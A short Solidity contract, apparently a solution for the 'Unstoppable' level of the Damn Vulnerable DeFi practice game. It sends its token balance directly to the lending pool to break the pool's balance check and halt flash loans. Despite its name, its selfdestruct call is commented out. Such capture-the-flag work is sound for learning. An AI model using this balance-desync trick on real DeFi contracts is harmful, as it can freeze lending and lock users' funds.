// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../unstoppable/UnstoppableLender.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title SelfDestruct
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SelfDestruct {

    UnstoppableLender private immutable pool;
    address private immutable owner;

    constructor(address poolAddress) {
        pool = UnstoppableLender(poolAddress);
        owner = msg.sender;
    }

    function selfDestruct(address tokenAddress) external {
        require(msg.sender == owner);
        uint amount = IERC20(tokenAddress).balanceOf(address(this));
        require(IERC20(tokenAddress).transfer(payable(address(pool)), amount), "Transfer of tokens failed");
        // selfdestruct(payable(address(pool)));
    }
}